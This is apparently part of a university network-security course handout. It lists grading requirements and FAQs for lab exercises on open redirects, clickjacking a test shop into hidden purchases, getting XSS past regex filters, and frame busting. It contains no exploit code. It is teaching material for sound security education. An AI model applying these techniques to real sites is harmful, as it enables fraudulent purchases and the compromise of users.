You can find an Iframe_Clickjack_Quickstart_Guide in ​<strong><em>Canvas -&gt; Files -&gt; Guides and Tutorials. </em></strong>This is helpful in case you don’t have very much experience in iframes or Javascript.

<h2><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Part 2 Grading </strong></h2>
Part 2.1 Open Redirect Requirements

<ul>
<li>Do not just give the URL of the product page.</li>
</ul>
<h3>Part 2.2 Clickjacking Requirements</h3>
<ul>
<li>Your exploit must work for the original version of Firefox provided in the VM.</li>
<li><strong>Displaying pop-ups that require user interaction</strong> will result in ​ <strong>zero credit.</strong>​</li>
<li>The iframe in your clickjacking page must be <strong>translucent as shown in the example</strong>​ , so​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; that it is easier for us to grade. <strong>10</strong>​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong> points will be deducted</strong>​ if overlays are nearly transparent or difficult to see.</li>
<li>In the real world, the attacker would make it transparent. But for grading purposes, we need to see it.</li>
<li><strong>After clicking on an overlay, the page should not be directed anywhere else. </strong></li>
<li><strong>We should be able to buy multiple distinct items at once without the page redirecting.</strong></li>
<li>Do not change the form id.</li>
<li>Do not change any code between the comment tags &lt;!– !!! DO NOT MODIFY ANYTHING</li>
</ul>
BELOW THIS COMMENT !!! –&gt; and &lt;!– !!! DO NOT MODIFY ANYTHING ABOVE THIS COMMENT !!! –&gt; in clickjack.html

<ul>
<li>Do not alter the appearance of the search form that is rendered by the clickjack.html that we have provided.</li>
<li>To test this, open the clickjack.html that we have provided in one browser tab and your clickjack.html in another tab. It should look exactly the same, <strong>pixel-by -pixel</strong>​ , if​ you switch between the two tabs.</li>
<li>Your exploit should not break the GTShop’s product search functionality.</li>
<li>Your exploit should not modify the appearance of the GTShop’s search results except for showing the translucent overlays.</li>
<li>To test this, perform a search using the GTShop site in one browser tab and then perform a search by using your clickjack.html in another tab. It should look identical, <strong>pixel-by-pixel</strong>, except for the translucent overlays.​</li>
<li>The user should <strong>NOT</strong>​ be redirected after being clickjacked. We will just click on some part​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; of the blue Info link and expect a purchase to be made in the background.</li>
<li>You may not use any third party JavaScript libraries, except for JQuery. If using JQuery, you must include this one from the CDN: <a href="https://code.jquery.com/jquery-3.3.1.min.js">https://code.jquery.com/jquery-3.3.1.min.j</a><u>​ </u><a href="https://code.jquery.com/jquery-3.3.1.min.js">s</a><a href="https://code.jquery.com/jquery-3.3.1.min.js">.</a><u>​</u> JQuery has to be an external reference and that we won’t include a local copy in the autograder.</li>
<li>The domain gtshop.com is not the same as www.gtshop.com. The shop is located at www.gtshop.com</li>
<li>Each overlay must cover the Info link entirely. However, the width of your overlays should not exceed the Info link column.</li>
<li>Properly positioning your overlays for different search results is critical.</li>
<li>An overlay for one Info link should not collide with another overlay for another Info link.</li>
<li>We will perform multiple purchases of different products on a given search results page.</li>
<li>Each item can only be purchased once on the search results page.</li>
<li>We will perform multiple different queries, and your implementation must work for all of them. These queries will not be revealed until grading is done.</li>
</ul>
Points will be deducted if you don’t adhere to assumptions and requirements listed here.

<h3>Deliverables</h3>
<ul>
<li><strong>txt </strong></li>
<li><strong>html </strong></li>
</ul>
<h3>Rubric</h3>
You will earn credit as follows:

&nbsp;

<table width="566">
<tbody>
<tr>
<td width="76"><strong>Points </strong></td>
<td width="490"><strong>Milestone </strong></td>
</tr>
<tr>
<td width="76"><strong>10 </strong></td>
<td width="490">All components of the redirect URL are correct. See

<a href="https://www.ibm.com/support/knowledgecenter/en/SSGMCP_5.3.0/com.ibm.cics.ts.internet.doc/topics/dfhtl_uricomp.html">https://www.ibm.com/support/knowledgecenter/en/SSGMCP_5.3.0/com.i </a><a href="https://www.ibm.com/support/knowledgecenter/en/SSGMCP_5.3.0/com.ibm.cics.ts.internet.doc/topics/dfhtl_uricomp.html">bm.cics.ts.internet.doc/topics/dfhtl_uricomp.html</a>
</td>
</tr>
<tr>
<td width="76"><strong>5 </strong></td>
<td width="490">Search results are properly shown for the secret query strings that we test.

To test this, compare your query results to the original GTShop page.
</td>
</tr>
<tr>
<td width="76"><strong>25 </strong></td>
<td width="490">When the user clicks on the Info link of any item in the search results, he or she purchases the item that the Info link points to.

For example, if the Info link URL is detail?id=6, then Anger Reliever dart board is purchased.
</td>
</tr>
<tr>
<td width="76"><strong>10 </strong></td>
<td width="490">The correct number of overlays is displayed on the search results page for all secret queries that we test.

For example, if a query returns five products, then there should only be five overlays on top of the five Info links.
</td>
</tr>
</tbody>
</table>
&nbsp;

&nbsp;

<h2><strong>Verifying File Hashes </strong></h2>
You can verify that the skeleton files and VM were properly downloaded by comparing the resulting hash:

&nbsp;

<table width="597">
<tbody>
<tr>
<td width="151"><strong>OS </strong></td>
<td width="446"><strong>Command </strong></td>
</tr>
<tr>
<td width="151">Windows</td>
<td width="446">CertUtil -hashfile filename MD5</td>
</tr>
<tr>
<td width="151">Mac</td>
<td width="446">md5 filename</td>
</tr>
<tr>
<td width="151">Linux</td>
<td width="446">md5sum filename</td>
</tr>
</tbody>
</table>
<h2><strong>Academic Integrity </strong></h2>
All submitted code must be written by you. You may, however, borrow and cite examples from the papers related to this project.

&nbsp;

Borrowing or adapting code from other students and websites like Stack Overflow, code repositories, and other sources is strictly forbidden.

&nbsp;

You may not discuss specific approaches or solutions to the problems. Keep your discussions at a high level. Sharing code is strictly forbidden. Note that we monitor Piazza and Slack and will report you to the Office of Student Integrity if there is a violation.

&nbsp;

You may not share test cases with others.

&nbsp;

As a reminder, please review the <a href="https://policylibrary.gatech.edu/student-affairs/academic-honor-code">Georgia Tech Honor Cod</a>​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://policylibrary.gatech.edu/student-affairs/academic-honor-code">e</a> and the course policies outlined in the​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; syllabus. If you are unsure about what is allowed or not allowed, please open a private Piazza post.

<h2><strong>Project Suggestions </strong></h2>
After the project you will be provided a Google Form for project suggestions. Good suggestions may be worth up to 1 percentage point of extra credit. An announcement will be made after the project and will be communicated via Piazza.

<strong>Project FAQs </strong>

<h3><strong>XSS FAQ </strong></h3>
<ul>
<li>If my XSS attack passes the regex filter, am I guaranteed to get full credits?
<ul>
<li>No, your XSS attack must be executable as well as pass the regex filter.</li>
</ul>
</li>
<li>Should we use ONLY the &lt;script&gt; tag in our XSS attack?
<ul>
<li>You can have whatever you like in between your script tags as long as it executes properly.</li>
</ul>
</li>
<li>Do we need to get an alert when entering our XSS in the XSS site?
<ul>
<li>No, we do not execute your code on the XSS server. This is why it’s imperative you test your code to ensure it’s executable before you submit.</li>
</ul>
</li>
<li>Does an XSS input have to pass all 3 filters?
<ul>
<li>No, an XSS input only has to pass its respective filter. For example, your 1st XSS attack need only pass the 1st filter and be executable, your 2nd XSS attack need only pass the 2nd filter and be executable, etc.</li>
</ul>
</li>
<li>Should the XSS attacks be carried out within the VM or they should also work on our host machine?
<ul>
<li>Please work inside the VM. The XSS website is only accessible from the VM.</li>
</ul>
</li>
</ul>
<h3><strong>Frame Busting FAQ </strong></h3>
<ul>
<li>Are you only testing the Chrome Extension in the provided VM? Or should this work anywhere/outside the VM?
<ul>
<li>We will be testing your Chrome Extension inside the provided VM. But realistically, your Chrome extension should work inside or outside the VM.</li>
</ul>
</li>
<li>Are you only testing the frame busting 20 times against this one page?
<ul>
<li>Not necessarily, your extension will need to work for any webpage that has the same vulnerability. Thus, any URL should not be hardcoded in your extension.</li>
</ul>
</li>
<li>Are we allowed to use an external website for our Frame Busting attack? For example, the 204-method requires us to employ a website that returns the 204 status code. ○ Yes, you’re allowed to use an external website.</li>
</ul>
<h3><strong>Clickjacking FAQ </strong></h3>
<ul>
<li>How will clickjacking be tested?
<ul>
<li>We will enter queries that should return multiple items, and then attempt to purchase multiple items. We will also enter in queries with extra characters and expect the correct results. For example, the query enhancer and eNhAnCeR%20 should return the exact same results.</li>
</ul>
</li>
<li>Should I redirect to a page after an item is purchased via an overlay?
<ul>
<li>No, no redirection should happen after an item is purchased via an overlay. Simply stay on the results page.</li>
</ul>
</li>
<li>Should items be purchasable only once?
<ul>
<li>If your overlay does not disappear after being clicked once, ensure that clicking the overlay again will not purchase the item again.</li>
</ul>
</li>
<li>Do overlays need to disappear after being clicked?
<ul>
<li>Not necessarily. Items should only be purchasable once. We recommend students to remove overlays once clicked to avoid items being purchased multiple times. However, if</li>
</ul>
</li>
</ul>
&nbsp;

GT​ CS 6262: Network Security

your overlays only purchase the item once even if clicked multiple times, then you will receive full credits.

&nbsp;
